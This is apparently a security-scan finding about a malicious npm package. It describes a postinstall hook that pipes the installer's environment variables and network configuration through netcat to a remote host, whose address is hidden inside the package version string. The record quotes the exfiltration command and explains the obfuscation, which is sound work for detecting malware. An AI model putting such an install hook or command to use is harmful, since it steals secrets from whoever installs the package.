summary: postinstall exfiltrates environment and network configuration to a version-encoded remote host
details: package.json declares a postinstall script that runs `(env; ip addr) | nc <host> 888`, where <host> is reconstructed at install time from `$npm_package_version` via three `cut` invocations that slice the version string into octets. On `npm install`, this bulk-dumps the installer's full process environment (including any secrets present in env) and local network interface configuration to a remote endpoint whose address is encoded in the package version. The adjacent tarball `evilpostinstall-192.168.1.100.tgz` demonstrates the version-as-IP encoding, letting the publisher redirect the destination per release. The exfil destination is not present as a plaintext literal in the manifest; it exists only as the reconstructed version string.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
